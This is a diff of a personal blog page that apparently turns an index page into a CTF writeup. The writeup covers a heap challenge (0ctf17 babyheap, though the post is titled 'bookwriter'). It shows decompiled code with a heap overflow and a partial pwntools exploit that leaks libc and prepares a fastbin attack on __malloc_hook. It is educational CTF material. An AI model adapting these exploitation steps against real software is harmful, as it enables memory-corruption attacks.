@@ -7,15 +7,20 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <meta name="baidu-site-verification" content="RNCre9JfIO" />
   <link rel="dns-prefetch" href="https://sunichi.github.io">
-  <title>Sunichi&#39;s Blog</title>
+  <title>pwnable tw bookwriter writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sunichi&#39;s Blog">
-<meta property="og:url" content="https://sunichi.github.io/page/2/index.html">
+  <meta name="description" content="This pwn is a classic heap pwn. In its Edit() function exits a heap overflow of arbitrarily write.">
+<meta name="keywords" content="ctf,pwn,heap,0ctf17">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable tw bookwriter writeup">
+<meta property="og:url" content="https://sunichi.github.io/2018/07/11/0ctf17-pwn-babyheap/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="This pwn is a classic heap pwn. In its Edit() function exits a heap overflow of arbitrarily write.">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-07-11T12:39:26.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunichi&#39;s Blog">
+<meta name="twitter:title" content="pwnable tw bookwriter writeup">
+<meta name="twitter:description" content="This pwn is a classic heap pwn. In its Edit() function exits a heap overflow of arbitrarily write.">
   
     <link rel="alternative" href="/atom.xml" title="Sunichi&#39;s Blog" type="application/atom+xml">
   
@@ -149,35 +154,59 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-suctf18-pwn-noend" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-0ctf17-pwn-babyheap" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/15/suctf18-pwn-noend/">suCTF pwn noend writeup</a>
+    <h1 class="article-title" itemprop="name">
+      pwnable tw bookwriter writeup
     </h1>
   
 
         
-        <a href="/2018/06/15/suctf18-pwn-noend/" class="archive-article-date">
-  	<time datetime="2018-06-15T12:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-15</time>
+        <a href="/2018/07/11/0ctf17-pwn-babyheap/" class="archive-article-date">
+  	<time datetime="2018-07-11T12:17:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>保护措施：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
-<p>使用IDA查看程序，发现此题所存在的漏洞。<br>
-        
-          <a class="article-more-a" href="/2018/06/15/suctf18-pwn-noend/#more">more >></a>
-        
+        <p>This pwn is a classic heap pwn. In its <code>Edit()</code> function exits a heap overflow of arbitrarily write.</p>
+<a id="more"></a>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Edit</span><span class="params">(__int64 List)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 Item; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  Item = InputNum();</span><br><span class="line">  v2 = Item;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)Item &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)Item &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Item = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24L</span>L * (<span class="keyword">signed</span> <span class="keyword">int</span>)Item + List);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)Item == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);                         <span class="comment">// overflow</span></span><br><span class="line">      Item = InputNum();</span><br><span class="line">      len = Item;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)Item &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        Item = InputString(*(_QWORD *)(<span class="number">24L</span>L * v2 + List + <span class="number">16</span>), len);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Because the List(contains each block’s status, size and content’s pointer) is at random address, we cannot overflow and overwrite the List. So what I chose to do is to overflow the chunk to leak the libc information and perform fastbin attack.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    </span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">'b *'</span> + str(hex(<span class="number">0x555555554000</span> + <span class="number">0x113d</span>)))</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#0</span></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    Add(p, <span class="number">0x200</span> - <span class="number">0x90</span> - <span class="number">0x10</span>) <span class="comment">#6</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#7</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#8</span></span><br><span class="line">    Edit(p, <span class="number">4</span>, <span class="string">'a'</span> * <span class="number">0x88</span> + p64(<span class="number">0x201</span>))</span><br><span class="line">    Delete(p, <span class="number">5</span>) <span class="comment">#5</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    recv = Show(p, <span class="number">6</span>)</span><br><span class="line">    </span><br><span class="line">    libc_base_addr = u64(recv[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x3c4b78</span></span><br><span class="line">    libc.address = libc_base_addr</span><br><span class="line">    <span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>])</span><br><span class="line">    <span class="comment"># chunk size 0x7f, ready for fastbin attack</span></span><br><span class="line">    fake_chunk = libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p><br></p>
+<blockquote>
+<h5 id="Relevant-Article"><a href="#Relevant-Article" class="headerlink" title="Relevant Article"></a>Relevant Article</h5><p><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p>
+</blockquote>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -194,90 +223,13 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/15/suctf18-pwn-noend/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ptmalloc-malloc_consolidate" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/04/ptmalloc-malloc_consolidate/">ptmalloc malloc_consolidate分析</a>
-    </h1>
-  
-
-        
-        <a href="/2018/06/04/ptmalloc-malloc_consolidate/" class="archive-article-date">
-  	<time datetime="2018-06-04T12:50:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>尝试做了下suCTF2018的noend，用到的泄漏的libc地址的方法之前未遇到过，顺带对<code>malloc_consolidate</code>的源代码进行了学习。</p>
-<p>以下分析基于glibc-2.23进行。</p>
-        
-          <a class="article-more-a" href="/2018/06/04/ptmalloc-malloc_consolidate/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
+      		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">libc</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ptmalloc</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">0ctf17</a>
         		</li>
       		
 		</ul>
@@ -286,16 +238,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/04/ptmalloc-malloc_consolidate/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/07/11/0ctf17-pwn-babyheap/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/11/12/hctf2018/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          hctf2018 pwn writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/07/07/suctf18-pwn-heap(offbyone)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">suCTF pwn heap(offbyone) writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -315,255 +335,14 @@
 
 
 
-
-  
-    <article id="post-qwb18-pwn-silent2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/16/qwb18-pwn-silent2/">强网杯18 pwn silent2 writeup</a>
-    </h1>
-  
-
-        
-        <a href="/2018/04/16/qwb18-pwn-silent2/" class="archive-article-date">
-  	<time datetime="2018-04-16T03:50:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>保护措施：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
-<p>此题与silent几乎完全一致，仅是在malloc的时候做了大小限制：<br>
-        
-          <a class="article-more-a" href="/2018/04/16/qwb18-pwn-silent2/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/16/qwb18-pwn-silent2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-qwb18-pwn-silent" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/15/qwb18-pwn-silent/">强网杯18 pwn silent writeup</a>
-    </h1>
-  
-
-        
-        <a href="/2018/04/15/qwb18-pwn-silent/" class="archive-article-date">
-  	<time datetime="2018-04-15T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>保护措施：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
-<p>使用IDA查看程序，发现此题存在Double Free，可以进行fastbin attack，并修改free@got的地址为system后获取shell。<br>
-        
-          <a class="article-more-a" href="/2018/04/15/qwb18-pwn-silent/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/15/qwb18-pwn-silent/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hitctf18-pwn250" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/12/hitctf18-pwn250/">hitctf18 pwn250 DragonBall writeup</a>
-    </h1>
-  
-
-        
-        <a href="/2018/04/12/hitctf18-pwn250/" class="archive-article-date">
-  	<time datetime="2018-04-12T12:15:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>此题的漏洞主要是在第4个选项，即wish函数中，在里面有栈溢出漏洞，能够利用栈溢出返回到任意地址中。用ida查看程序，需要集齐7龙珠才能许愿。初始有15元，购买1个龙珠5元，出售1个龙珠3元，在购买时进行下述检查：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !money )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You don't have enough money."</span>);</span><br><span class="line">money -= <span class="number">5</span>;</span><br><span class="line">++dragon_ball_num;</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2018/04/12/hitctf18-pwn250/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/12/hitctf18-pwn250/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -586,8 +365,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
